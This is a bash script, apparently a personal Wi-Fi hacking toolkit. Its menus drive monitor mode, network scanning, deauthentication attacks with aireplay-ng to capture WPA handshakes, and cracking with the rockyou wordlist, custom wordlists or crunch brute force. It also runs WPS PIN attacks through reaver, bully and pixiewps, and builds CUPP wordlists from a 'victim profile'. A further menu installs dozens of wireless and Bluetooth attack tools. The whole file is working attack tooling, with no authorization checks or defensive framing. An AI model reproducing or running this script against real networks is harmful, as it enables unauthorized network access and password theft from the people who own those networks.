#!/bin/bash
echo -e "\nInstalling Needed Tools"
echo -e "\n"
apt-get install -y aircrack-ng crunch xterm wordlists reaver pixiewps bully xterm wifite python3 git
sleep 3
clear

intro() {
    clear
    echo -e "\033[1;32m"
    cat << "EOF"

      ██████╗    ███████╗   ██████╗        ██╗    ██╗ ██╗  ██╗ ██╗   ██╗ ██████╗ 
     ██╔════╝    ██╔══██║   ██╔══██╗       ██║    ██║ ██║  ██║ ██║   ██║ ╚════██╗
     ██║  ███╗   ███████║   ██║  ██║       ██║ █╗ ██║ ███████║ ██║   ██║  █████╔╝
     ██║   ██║   ██╔══██║   ██║  ██║       ██║███╗██║ ╚════██║ ╚██╗ ██╔╝  ╚═══██╗
     ╚██████╔╝   ██║  ██║   ██████╔╝       ╚███╔███╔╝      ██║  ╚████╔╝  ██████╔╝
      ╚═════╝    ╚═╝  ╚═╝   ╚═════╝         ╚══╝╚══╝       ╚═╝   ╚═══╝   ╚═════╝ 
                                                                                 
           ╔═══════════════════════════════════════════════════════════╗
           ║          [ Coded By: Mohamed Gad - GAD_W4V3 ]             ║
           ╚═══════════════════════════════════════════════════════════╝
                                                                    
EOF
    echo -e "\033[1;32m"
    cat << "EOF"
  ┌──────────────────────────────────────────────────────────────────────────────────┐
  │                                MAIN MENU                                         │
  ├──────────────────────────────────────────────────────────────────────────────────┤
  │                                                                                  │
  │  [1]  Start Monitor Mode                                                         │
  │  [2]  Stop Monitor Mode                                                          │
  │  [3]  Scan Networks                                                              │
  │  [4]  Capture Handshake (Monitor Mode Required)                                  │
  │  [5]  Install Wireless Tools                                                     │
  │  [6]  Crack with RockYou Wordlist                                                │
  │  [7]  Crack with Custom Wordlist                                                 │
  │  [8]  Crack without Wordlist (Brute Force)                                       │
  │  [9]  Generate Custom Wordlist                                                   │
  │  [10] WPS Attack Suite                                                           │
  │  [11] Scan WPS-Enabled Networks                                                  │
  │  [12] CUPP - Advanced Wordlist Generator                                         │
  │                                                                                  │
  ├──────────────────────────────────────────────────────────────────────────────────┤
  │  [0]  → About / Credits                                                          │
  │  [00] → Exit Program                                                             │
  └──────────────────────────────────────────────────────────────────────────────────┘
EOF
    echo -e "\033[1;33m"
    echo -ne "    [?] Enter Your Choice → "
    echo -e "\033[0m"
    read var

    case $var in
        1)
            echo -e "\nEnter the interface:(Default(wlan0/wlan1))"
            read interface
            airmon-ng start $interface && airmon-ng check kill
            intro
            ;;
        2)
            echo -e "\nEnter the interface:(Default(wlan0mon/wlan1mon))"
            read interface
            airmon-ng stop $interface && service network-manager restart
            intro
            ;;
        3)
            echo -e "\nEnter the interface:(Default >> (wlan0mon/wlan1mon))"
            read interface
            echo "When Done Press CTRL+c"
            sleep 3
            airodump-ng $interface -M
            sleep 10
            intro
            ;;
        4)
            echo -e "\nEnter the interface:(Default >>(wlan0mon/wlan1mon))"
            read interface
            echo -e "\nWhen Done Press CTRL+c"
            echo -e "\nNote: Under Probe it might be Passwords So copy them to the wordlist file"
            echo -e "\nDon't Attack The Network if its Data is ZERO (you waste your time)"
            echo -e "\nyou Can use 's' to arrange networks"
            sleep 7
            airodump-ng $interface -M
            echo -e "\nEnter the bssid of the target?"
            read bssid
            echo -e "\nEnter the channel of the network?"
            read channel
            echo "Enter the path of the output file ?"
            read path
            echo -e "\nEnter the number of the packets [1-10000] ( 0 for unlimited number)"
            echo "the number of the packets Depends on the Distance Between you and the network"
            read dist
            xterm -e "aireplay-ng -0 $dist -a $bssid $interface" &
            airodump-ng $interface --bssid $bssid -c $channel -w $path
            intro
            ;;
        5)
            wire
            ;;
        0)
            clear
            NAME="mogad77"
            URL="https://www.linkedin.com/in/mogad77/"
            OSC_OPEN=$'\e]8;;'"$URL"$'\a' 
            OSC_CLOSE=$'\e]8;;\a'
            git_name="M 0 G @ D"
            URL_git="https://github.com/Mogad77"
            OSC_OPEN2=$'\e]8;;'"$URL_git"$'\a' 
            OSC_CLOSE2=$'\e]8;;\a'
            
            cat <<EOF
═══════════════════════════════════════════════════════════════════
              ╔═══════════════════════════════════╗
              ║        [ A B O U T   M E ]        ║
              ╚═══════════════════════════════════╝

    Name      : Mohamed Gad 
    Linked-IN : ${OSC_OPEN}${NAME}${OSC_CLOSE}
    GitHub    : ${OSC_OPEN2}${git_name}${OSC_CLOSE2}
    

═══════════════════════════════════════════════════════════════════
EOF
            exit 0
            ;;
        00)
            exit 0
            ;;
        6)
            if [ -f "/usr/share/wordlists/rockyou.txt" ]; then
                echo -e "\nEnter the path of the handshake file ?"
                read path
                echo -e "\nTo exit Press CTRL +C"
                aircrack-ng $path -w /usr/share/wordlists/rockyou.txt
                sleep 5d
                exit 0
            else
                gzip -d /usr/share/wordlists/rockyou.txt.gz
                echo -e "\nEnter the path of the handshake file ?"
                read path
                echo -e "\nTo exit Press CTRL +C"
                aircrack-ng $path -w /usr/share/wordlists/rockyou.txt
                sleep 5d
                exit 0
            fi
            ;;
        7)
            echo -e "\nEnter the path of the handshake file ?"
            read path
            echo -e "\nEnter the path of the wordlist ?"
            read wordlist
            aircrack-ng $path -w $wordlist
            exit 0
            ;;
        8)
            echo -e "\nEnter the essid of the network ?(Be careful when you type it and use 'the name of the network') "
            read essid
            echo -e "\nEnter the path of the handshake file ?"
            read path
            echo -e "\nEnter the minimum length of the password (8/64)?"
            read mini
            echo -e "\nEnter the maximum length of the password (8/64)?"
            read max
            cat << "EOF"
    ╔══════════════════════════════════════════════════════════════════════════════════╗
    ║                           CHARACTER SET SELECTION                                ║
    ╚══════════════════════════════════════════════════════════════════════════════════╝
    
    ┌────────────────────────────────────────────────────────────────────────────────┐
    │  [1]  → Lowercase Only           (abcdefghijklmnopqrstuvwxyz)                  │
    │  [2]  → Uppercase Only           (ABCDEFGHIJKLMNOPQRSTUVWXYZ)                  │
    │  [3]  → Numbers Only             (0123456789)                                  │
    │  [4]  → Symbols Only             (!#$%/=?{}[]-*:;)                             │
    │  [5]  → Lower + Upper            (a-zA-Z)                                      │
    │  [6]  → Lower + Numbers          (a-z0-9)                                      │
    │  [7]  → Upper + Numbers          (A-Z0-9)                                      │
    │  [8]  → Symbols + Numbers        (!@#0-9)                                      │
    │  [9]  → Lower + Upper + Numbers  (a-zA-Z0-9)                                   │
    │  [10] → Lower + Upper + Symbols  (a-zA-Z!@#)                                   │
    │  [11] → ALL Characters           (a-zA-Z0-9!@#$%...)                           │
    │  [12] → Custom Characters        (Your Own Set)                                │
    └────────────────────────────────────────────────────────────────────────────────┘
    
    ╔══════════════════════════════════════════════════════════════════════════════════╗
    ║  [!] WARNING: Brute Force Attack Detected                                        ║
    ║  [!] Time Required: Hours → Days → Weeks → Months                                ║
    ║  [!] Wordlist Size: May reach hundreds of TERABYTES                              ║
    ║  [!] Performance: Will decrease with larger character sets                       ║
    ║  [!] Recommendation: Use powerful hardware & be patient                          ║
    ╚══════════════════════════════════════════════════════════════════════════════════╝
EOF
            echo -e "\nEnter your choice here : ?"
            read set
            case $set in
                1) test="abcdefghijklmnopqrstuvwxyz" ;;
                2) test="ABCDEFGHIJKLMNOPQRSTUVWXYZ" ;;
                3) test="0123456789" ;;
                4) test="!#\$%/=?{}[]-*:;" ;;
                5) test="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" ;;
                6) test="abcdefghijklmnopqrstuvwxyz0123456789" ;;
                7) test="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" ;;
                8) test="!#\$%/=?{}[]-*:;0123456789" ;;
                9) test="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" ;;
                10) test="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#\$%/=?{}[]-*:;" ;;
                11) test="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#\$%/=?{}[]-*:;" ;;
                12)
                    echo "Enter you Own Words and numbers"
                    read test
                    ;;
                *)
                    echo -e "\nNot Found"
                    intro
                    ;;
            esac
            crunch $mini $max $test | aircrack-ng $path -e "$essid" -w-
            echo "Copy the Password and Close the tool"
            sleep 3d
            ;;
        9)
            echo -e "\nEnter the minimum length of the password (8/64)?"
            read mini
            echo -e "\nEnter the maximum length of the password (8/64)?"
            read max
            echo -e "\nEnter the path of the output file?"
            read path
            echo -e "\nEnter what you want the password contain ?"
            read password
            crunch $mini $max $password -o $path
            echo "The wordlist in >>>>> $path Named as START"
            ;;
        10)
            clear
            cat << "EOF"
    ╔════════════════════════════════════════════════════════════════════════════════╗
    ║                              WPS ATTACK SUITE                                  ║
    ╚════════════════════════════════════════════════════════════════════════════════╝
    
    ┌────────────────────────────────────────────────────────────────────────────────┐
    │                                                                                │
    │  [1] Reaver Attack          (Standard WPS PIN Attack)                          │
    │  [2] Bully Attack           (Alternative WPS Attack)                           │
    │  [3] Wifite                 (Automated - RECOMMENDED)                          │
    │  [4] PixieWPS Attack        (WPS Pixie Dust Vulnerability)                     │
    │                                                                                │
    │  [0] Return to Main Menu                                                       │
    │                                                                                │
    └────────────────────────────────────────────────────────────────────────────────┘
EOF
            echo -e "\033[1;31m"
            echo " 
   ╔══════════════════════════════════════════════════════════════════════════════════╗
   ║  [!] External WiFi Adapter Required (Must Support Monitor Mode & Injection)      ║
   ╚══════════════════════════════════════════════════════════════════════════════════╝"
             echo -e "\033[0m"
            echo "Choose the kind of the attack(External WIFI Adapter Require) ?"
            read attack
            case $attack in
                1)
                    echo -e "\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon))"
                    read interface
                    echo -e "\nEnter the bssid of the network ?"
                    read bssid
                    reaver -i $interface -b $bssid -vv
                    intro
                    ;;
                2)
                    echo -e "\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)"
                    read interface
                    echo -e "\nEnter the bssid of the network ?"
                    read bssid
                    echo -e "\nEnter the channel of the network ?"
                    read channel
                    bully -b $bssid -c $channel --pixiewps $interface
                    intro
                    ;;
                3)
                    wifite
                    intro
                    ;;
                4)
                    echo -e "\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)"
                    read interface
                    echo -e "\nEnter the bssid of the network ?"
                    read bssid
                    reaver -i $interface -b $bssid -K
                    intro
                    ;;
                0)
                    intro
                    ;;
            esac
            ;;
        11)
            echo -e "\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)"
            read interface
            airodump-ng -M --wps $interface
            sleep 5
            intro
            ;;
        12)
            cupp_menu
            ;;
        *)
            echo "Not Found"
            sleep 2
            intro
            ;;
    esac
}

cupp_menu() {
    clear
    echo -e "\033[1;36m"
    cat << "EOF"
    ╔════════════════════════════════════════════════════════════════════════════════╗
    ║                    CUPP - Common User Passwords Profiler                       ║
    ║                      Create Targeted Wordlists for WiFi                        ║
    ╚════════════════════════════════════════════════════════════════════════════════╝
    
    ┌────────────────────────────────────────────────────────────────────────────────┐
    │                                                                                │
    │  [1] Install/Update CUPP Tool                                                  │
    │  [2] Interactive Mode        (Create wordlist from victim profile)             │
    │  [3] Improve Existing List   (Enhance existing wordlist)                       │
    │  [4] Download Wordlists      (Get wordlists from repository)                   │
    │  [5] AlectoDB Download       (Get username/password database)                  │
    │                                                                                │
    │  [0] Return to Main Menu                                                       │
    │                                                                                │
    └────────────────────────────────────────────────────────────────────────────────┘
EOF
    echo -e "\033[1;33m"
    echo -ne "    [?] Enter Your Choice → "
    echo -e "\033[0m"
    read cupp_choice

    case $cupp_choice in
        1)
            echo -e "\n\033[1;32m[+] Installing CUPP Tool...\033[0m"
            if [ -d "cupp" ]; then
                echo -e "\033[1;33m[*] CUPP directory exists. Updating...\033[0m"
                cd cupp
                git pull
                cd ..
            else
                git clone https://github.com/Mebus/cupp.git
            fi
            
            if [ -f "cupp.py" ]; then
                cp cupp.py cupp/
                echo -e "\033[1;32m[+] Custom cupp.py copied to cupp directory\033[0m"
            fi
            
            echo -e "\033[1;32m[+] CUPP installed successfully!\033[0m"
            sleep 2
            cupp_menu
            ;;
        2)
            if [ ! -d "cupp" ]; then
                echo -e "\033[1;31m[-] CUPP not installed. Installing now...\033[0m"
                git clone https://github.com/Mebus/cupp.git
            fi
            echo -e "\n\033[1;32m[+] Starting CUPP Interactive Mode...\033[0m"
            echo -e "\033[1;33m[*] Answer questions about your target to generate custom wordlist\033[0m"
            sleep 2
            cd cupp
            python3 cupp.py -i
            cd ..
            echo -e "\n\033[1;32m[+] Wordlist generated! Check cupp directory\033[0m"
            read -p "Press Enter to continue..."
            cupp_menu
            ;;
        3)
            if [ ! -d "cupp" ]; then
                echo -e "\033[1;31m[-] CUPP not installed. Installing now...\033[0m"
                git clone https://github.com/Mebus/cupp.git
            fi
            echo -e "\n\033[1;32m[+] Improve Existing Wordlist\033[0m"
            echo -e "\nEnter the full path of wordlist to improve:"
            read wordlist_path
            if [ -f "$wordlist_path" ]; then
                cd cupp
                python3 cupp.py -w "$wordlist_path"
                cd ..
                echo -e "\n\033[1;32m[+] Improved wordlist created!\033[0m"
            else
                echo -e "\033[1;31m[-] File not found: $wordlist_path\033[0m"
            fi
            read -p "Press Enter to continue..."
            cupp_menu
            ;;
        4)
            if [ ! -d "cupp" ]; then
                echo -e "\033[1;31m[-] CUPP not installed. Installing now...\033[0m"
                git clone https://github.com/Mebus/cupp.git
            fi
            echo -e "\n\033[1;32m[+] Download Wordlists from Repository\033[0m"
            cd cupp
            python3 cupp.py -l
            cd ..
            read -p "Press Enter to continue..."
            cupp_menu
            ;;
        5)
            if [ ! -d "cupp" ]; then
                echo -e "\033[1;31m[-] CUPP not installed. Installing now...\033[0m"
                git clone https://github.com/Mebus/cupp.git
            fi
            echo -e "\n\033[1;32m[+] Downloading AlectoDB Database...\033[0m"
            cd cupp
            python3 cupp.py -a
            cd ..
            echo -e "\n\033[1;32m[+] AlectoDB downloaded successfully!\033[0m"
            read -p "Press Enter to continue..."
            cupp_menu
            ;;
        0)
            intro
            ;;
        *)
            echo -e "\033[1;31m[-] Invalid choice!\033[0m"
            sleep 2
            cupp_menu
            ;;
    esac
}

wire() {
    clear
    cat << "EOF"
 1) Aircrack-ng                         18) Kismet
 2) Asleap                              19) mdk3
 3) Bluelog                             20) mfcuk
 4) BlueMaho                            21) mfoc
 5) Bluepot                             22) mfterm
 6) BlueRanger                          23) Multimon-NG
 7) Bluesnarfer                         24) PixieWPS
 8) Bully                               25) Reaver
 9) coWPAtty                            26) redfang
10) crackle                             27) RTLSDR Scanner
11) eapmd5pass                          28) Spooftooph
12) Fern Wifi Cracker                   29) Wifi Honey
13) Ghost Phisher                       30) Wifitap
14) GISKismet                           31) Wifite
15) gr-scan                             32) CUPP (Wordlist Generator)
16) kalibrate-rtl                       33) airgeddon
17) KillerBee                           34) wifite v2

 0) Install All Wireless Tools
00) Back to Main Menu
EOF
    read -p "Enter The number of the tool : >>> " w
    case $w in
        1) apt-get update && apt-get install -y aircrack-ng ;;
        2) apt-get update && apt-get install -y asleap ;;
        3) apt-get update && apt-get install -y bluelog ;;
        4) apt-get update && apt-get install -y bluemaho ;;
        5) apt-get update && apt-get install -y bluepot ;;
        6) apt-get update && apt-get install -y blueranger ;;
        7) apt-get update && apt-get install -y bluesnarfer ;;
        8) apt-get update && apt-get install -y bully ;;
        9) apt-get update && apt-get install -y cowpatty ;;
        10) apt-get update && apt-get install -y crackle ;;
        11) apt-get update && apt-get install -y eapmd5pass ;;
        12) apt-get update && apt-get install -y fern-wifi-cracker ;;
        13) apt-get update && apt-get install -y ghost-phisher ;;
        14) apt-get update && apt-get install -y giskismet ;;
        15) apt-get install -y git && git clone git://git.kali.org/packages/gr-scan.git ;;
        16) apt-get update && apt-get install -y kalibrate-rtl ;;
        17) apt-get update && apt-get install -y killerbee-ng ;;
        18) apt-get update && apt-get install -y kismet ;;
        19) apt-get update && apt-get install -y mdk3 ;;
        20) apt-get update && apt-get install -y mfcuk ;;
        21) apt-get update && apt-get install -y mfoc ;;
        22) apt-get update && apt-get install -y mfterm ;;
        23) apt-get update && apt-get install -y multimon-ng ;;
        24) apt-get update && apt-get install -y pixiewps ;;
        25) apt-get update && apt-get install -y reaver ;;
        26) apt-get update && apt-get install -y redfang ;;
        27) apt-get update && apt-get install -y rtlsdr-scanner ;;
        28) apt-get update && apt-get install -y spooftooph ;;
        29) apt-get update && apt-get install -y wifi-honey ;;
        30) apt-get update && apt-get install -y wifitap ;;
        31) apt-get update && apt-get install -y wifite ;;
        32) 
            apt-get update && apt-get install -y python3 git
            if [ -d "cupp" ]; then
                echo "CUPP already installed. Updating..."
                cd cupp && git pull && cd ..
            else
                git clone https://github.com/Mebus/cupp.git
            fi
            echo "CUPP installed/updated successfully!"
            ;;
        33) echo "Installing airgeddon..."
            apt-get update && apt-get install -y git
            git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
            ;;
        34) echo "Installing wifite v2..."
            apt-get update && apt-get install -y git
            git clone https://github.com/derv82/wifite2.git
            ;;
        0) 
            echo "Installing ALL wireless tools..."
            apt-get install -y aircrack-ng asleap bluelog blueranger bluesnarfer bully cowpatty crackle eapmd5pass fern-wifi-cracker ghost-phisher giskismet gqrx kalibrate-rtl killerbee kismet mdk3 mfcuk mfoc mfterm multimon-ng pixiewps reaver redfang spooftooph wifi-honey wifitap wifite python3 git
            ;;
        00) intro ;;
        *) echo "Not Found" ;;
    esac
    wire
}


intro
